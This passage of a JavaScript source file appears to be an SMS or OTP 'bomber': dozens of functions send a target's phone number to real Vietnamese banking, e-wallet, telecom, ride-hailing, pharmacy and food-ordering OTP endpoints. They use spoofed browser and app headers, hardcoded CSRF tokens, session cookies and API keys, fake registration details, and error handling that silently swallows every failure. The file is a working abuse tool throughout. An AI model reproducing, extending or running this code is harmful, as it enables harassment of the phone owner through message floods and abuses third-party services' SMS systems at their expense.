			'content-type': 'application/json',
			'origin': 'https://vinid.net',
			'referer': 'https://vinid.net/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone, countryCode: '84' };
		await axios.post('https://api.vinid.net/v1/auth/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Momo(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://momo.vn',
			'referer': 'https://momo.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phoneNumber: phone };
		await axios.post('https://api.momo.vn/api/user/otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_ZaloPay(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://zalopay.vn',
			'referer': 'https://zalopay.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://api.zalopay.vn/v1/user/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Bidv(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.bidv.com.vn',
			'referer': 'https://www.bidv.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.bidv.com.vn/api/user/otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Vietcombank(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.vietcombank.com.vn',
			'referer': 'https://www.vietcombank.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.vietcombank.com.vn/api/auth/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Techcombank(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.techcombank.com.vn',
			'referer': 'https://www.techcombank.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.techcombank.com.vn/api/user/otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Grab(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://www.grab.com',
			'referer': 'https://www.grab.com/vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phoneNumber: phone, countryCode: '84' };
		await axios.post('https://www.grab.com/sg/v3/otp/send', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Be(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.be.vn',
			'referer': 'https://www.be.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.be.vn/api/auth/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_GoViet(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.goviet.vn',
			'referer': 'https://www.goviet.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone, countryCode: '84' };
		await axios.post('https://www.goviet.vn/api/v1/auth/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Now(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.now.vn',
			'referer': 'https://www.now.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.now.vn/api/v1/auth/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Baemin(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.baemin.vn',
			'referer': 'https://www.baemin.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.baemin.vn/api/auth/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_ShopFood(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.shopfood.vn',
			'referer': 'https://www.shopfood.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.shopfood.vn/api/user/otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Foody(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.foody.vn',
			'referer': 'https://www.foody.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.foody.vn/api/user/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_PasGo(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://www.pasgo.vn',
			'referer': 'https://www.pasgo.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = { phone: phone };
		await axios.post('https://www.pasgo.vn/api/auth/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Takomo(phone) {
	try {
		const cookies = {
			'_ga': 'GA1.1.1234567890.1234567890',
			'_gid': 'GA1.1.1234567890.1234567890',
		};
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN,vi;q=0.9',
			'content-type': 'application/json',
			'origin': 'https://lk.takomo.vn',
			'referer': 'https://lk.takomo.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		};
		const jsonData = {
			data: {
				phone: phone,
				code: 'resend',
				channel: 'ivr',
			},
		};
		await axios.post('https://lk.takomo.vn/api/4/client/otp/send', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

// Helper function để format phone number
function formatPhoneNumber(phone) {
	if (phone.startsWith('09') || phone.startsWith('03')) {
		return '+84' + phone.slice(1);
	}
	return phone;
}

// Thêm các hàm còn thiếu từ file Python
async function sendOTP_Medicare_V2(phone) {
	try {
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json',
			'DNT': '1',
			'Origin': 'https://medicare.vn',
			'Referer': 'https://medicare.vn/login',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-XSRF-TOKEN': 'eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0=',
		};
		const jsonData = { mobile: phone, mobile_country_prefix: '84' };
		await axios.post('https://medicare.vn/api/otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_BeautyBox(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi',
			'content-type': 'application/json',
			'dnt': '1',
			'key': 'ac41e98f028aa44aac947da26ceb7cff',
			'origin': 'https://beautybox.com.vn',
			'referer': 'https://beautybox.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'timestamp': '1722426119478',
		};
		const jsonData = { phoneNumber: phone };
		await axios.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_ViettelPost(phone) {
	try {
		const headers = {
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Origin': 'null',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const data = new URLSearchParams({
			'FormRegister.FullName': 'Nguyễn Quang Ngọc',
			'FormRegister.Phone': phone,
			'FormRegister.Password': 'BEAUTYBOX12a@',
			'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
			'ConfirmOtpType': 'Register',
			'FormRegister.IsRegisterFromPhone': 'true',
			'__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
		});
		await axios.post('https://id.viettelpost.vn/Account/SendOTPByPhone', data, { headers });
	} catch (e) {}
}

async function sendOTP_Lozi_V2(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi',
			'content-type': 'application/json',
			'origin': 'https://lozi.vn',
			'referer': 'https://lozi.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-access-token': 'unknown',
			'x-city-id': '50',
			'x-lozi-client': '1',
		};
		const jsonData = { countryCode: '84', phoneNumber: phone };
		await axios.post('https://mocha.lozi.vn/v1/invites/use-app', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Vinpearl_V2(phone) {
	try {
		// First request to get image
		const cookies = {
			'__cf_bm': 'ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw',
			'__cfruid': '3f11778af16256a63eb265af0f726daceeb866de-1722350965',
		};
		await axios.get('https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg', { headers: {
			'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
			'referer': 'https://booking.vinpearl.com/vi/login-vpt',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		}, withCredentials: true });
		
		// Second request to send OTP
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN',
			'authorization': 'Bearer undefined',
			'content-type': 'application/json',
			'origin': 'https://booking.vinpearl.com',
			'referer': 'https://booking.vinpearl.com/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-display-currency': 'VND',
		};
		const jsonData = { channel: 'vpt', username: phone, type: 1, OtpChannel: 1 };
		await axios.post('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_ViettelMoney(phone) {
	try {
		const headers = {
			'User-Agent': 'Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1',
			'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5',
			'Content-Type': 'application/json',
			'app-version': '8.8.8',
			'product': 'VIETTELPAY',
			'type-os': 'ios',
			'accept-language': 'vi',
			'imei': 'DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD',
			'device-name': 'iPhone',
			'os-version': '16.0',
			'authority-party': 'APP',
		};
		const jsonData = {
			identityType: 'msisdn',
			identityValue: phone,
			type: 'REGISTER',
		};
		await axios.post('https://api8.viettelpay.vn/customer/v2/accounts/register', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_XanhSM_SMS(phone) {
	try {
		let formattedPhone = formatPhoneNumber(phone);
		const headers = {
			'User-Agent': 'UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1',
			'Accept': 'application/json',
			'Accept-Encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
			'Content-Type': 'application/json',
			'app-version-label': '3.15.0',
			'app-build-number': '89',
			'accept-language': 'vi',
			'platform': 'iOS',
			'aud': 'user_app',
		};
		const params = { aud: 'user_app', platform: 'ios' };
		const jsonData = {
			is_forgot_password: false,
			phone: formattedPhone,
			provider: 'VIET_GUYS',
		};
		await axios.post('https://api.gsm-api.net/auth/v1/public/otp/send', jsonData, { headers, params });
	} catch (e) {}
}

async function sendOTP_XanhSM_Zalo(phone) {
	try {
		let formattedPhone = formatPhoneNumber(phone);
		const headers = {
			'User-Agent': 'UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1',
			'Accept': 'application/json',
			'Accept-Encoding': 'br;q=1.0, gzip;q=0.9, deflate;q=0.8',
			'Content-Type': 'application/json',
			'app-version-label': '3.15.0',
			'app-build-number': '89',
			'accept-language': 'vi',
			'platform': 'iOS',
			'aud': 'user_app',
		};
		const params = { platform: 'ios', aud: 'user_app' };
		const jsonData = {
			phone: formattedPhone,
			is_forgot_password: false,
			provider: 'ZNS_ZALO',
		};
		await axios.post('https://api.gsm-api.net/auth/v1/public/otp/send', jsonData, { headers, params });
	} catch (e) {}
}

async function sendOTP_Popeyes(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://popeyes.vn',
			'ppy': 'CWNOBV',
			'referer': 'https://popeyes.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-client': 'WebApp',
		};
		const jsonData = {
			phone: phone,
			firstName: 'Nguyễn',
			lastName: 'Ngọc',
			email: 'th456do1g110@hotmail.com',
			password: 'et_SECUREID()',
		};
		await axios.post('https://api.popeyes.vn/api/v1/register', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Ahamove(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi',
			'content-type': 'application/json;charset=UTF-8',
			'origin': 'https://app.ahamove.com',
			'referer': 'https://app.ahamove.com/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = {
			mobile: phone,
			country_code: 'VN',
			firebase_sms_auth: true,
		};
		await axios.post('https://api.ahamove.com/api/v3/public/user/login', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_FMComVN(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'authorization': 'Bearer',
			'content-type': 'application/json;charset=UTF-8',
			'origin': 'https://fm.com.vn',
			'referer': 'https://fm.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
			'x-emp': '',
			'x-fromweb': 'true',
			'x-requestid': '00c641a2-05fb-4541-b5af-220b4b0aa23c',
		};
		const jsonData = {
			Phone: phone,
			LatOfMap: '106',
			LongOfMap: '108',
			Browser: '',
		};
		await axios.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Dominos(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi',
			'content-type': 'application/json',
			'dmn': 'DSNKFN',
			'origin': 'https://dominos.vn',
			'referer': 'https://dominos.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
		};
		const jsonData = {
			phone_number: phone,
			email: 'rancellramseyis792@gmail.com',
			type: 0,
			is_register: true,
		};
		await axios.post('https://dominos.vn/api/v1/users/send-otp', jsonData, { headers, timeout: 10000 });
	} catch (e) {}
}

// Thêm các hàm còn thiếu từ file Python
async function sendOTP_FPTPlay_ForgotPass(phone) {
	try {
		const cookies = {
			'auth.strategy': '',
			'expire_welcome': '14400',
			'fpt_uuid': '%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22',
			'ajs_group_id': 'null',
			'G_ENABLED_IDPS': 'google',
			'CDP_ANONYMOUS_ID': '1722362340735',
			'CDP_USER_ID': '1722362340735',
		};
		await axios.get('https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js', { headers: {
			'accept': '*/*',
			'referer': 'https://fptplay.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		}, withCredentials: true });
		
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'content-type': 'application/json; charset=UTF-8',
			'origin': 'https://fptplay.vn',
			'referer': 'https://fptplay.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-did': 'A0EB7FD5EA287DBF',
		};
		const jsonData = { phone: phone, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' };
		await axios.post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_NhaThuocLongChau(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'access-control-allow-origin': '*',
			'content-type': 'application/json',
			'order-channel': '1',
			'origin': 'https://nhathuoclongchau.com.vn',
			'referer': 'https://nhathuoclongchau.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-channel': 'EStore',
		};
		const jsonData = { phoneNumber: phone, otpType: 0, fromSys: 'WEBKHLC' };
		await axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_NhaThuocLongChau_Type1(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'access-control-allow-origin': '*',
			'content-type': 'application/json',
			'order-channel': '1',
			'origin': 'https://nhathuoclongchau.com.vn',
			'referer': 'https://nhathuoclongchau.com.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-channel': 'EStore',
		};
		const jsonData = { phoneNumber: phone, otpType: 1, fromSys: 'WEBKHLC' };
		await axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_GalaxyPlay(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi',
			'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
			'dnt': '1',
			'origin': 'https://galaxyplay.vn',
			'referer': 'https://galaxyplay.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-requested-with': 'XMLHttpRequest',
		};
		const params = { phone: phone };
		await axios.post('https://api.glxplay.io/account/phone/checkPhoneOnly', null, { headers, params });
		await axios.post('https://api.glxplay.io/account/phone/verify', null, { headers, params });
	} catch (e) {}
}

async function sendOTP_EmartMall(phone) {
	try {
		const cookies = {
			'emartsess': '30rqcrlv76osg3ghra9qfnrt43',
			'default': '7405d27b94c61015ad400e65ba',
			'language': 'vietn',
			'currency': 'VND',
			'emartCookie': 'Y',
		};
		const headers = {
			'Accept': 'application/json, text/javascript, */*; q=0.01',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Origin': 'https://emartmall.com.vn',
			'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-Requested-With': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({ mobile: phone });
		await axios.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_MyViettel2(phone) {
	try {
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json;charset=UTF-8',
			'Origin': 'https://viettel.vn',
			'Referer': 'https://viettel.vn/myviettel',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-CSRF-TOKEN': 'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7',
			'X-Requested-With': 'XMLHttpRequest',
			'X-XSRF-TOKEN': 'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==',
		};
		const jsonData = { msisdn: phone, type: 'register' };
		await axios.post('https://viettel.vn/api/get-otp-contract-mobile', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_ViettelRegister(phone) {
	try {
		const cookies = {
			'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
			'__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
			'redirectLogin': 'https://viettel.vn/dang-ky',
			'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
		};
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json;charset=UTF-8',
			'Origin': 'https://viettel.vn',
			'Referer': 'https://viettel.vn/dang-ky',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
			'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
			'X-Requested-With': 'XMLHttpRequest',
			'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
		};
		const jsonData = { msisdn: phone };
		await axios.post('https://viettel.vn/api/get-otp', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Viettel_V2(phone) {
	try {
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json;charset=UTF-8',
			'DNT': '1',
			'Origin': 'https://viettel.vn',
			'Referer': 'https://viettel.vn/myviettel',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-CSRF-TOKEN': 'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7',
			'X-Requested-With': 'XMLHttpRequest',
			'X-XSRF-TOKEN': 'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==',
		};
		const jsonData = { msisdn: phone, type: 'register' };
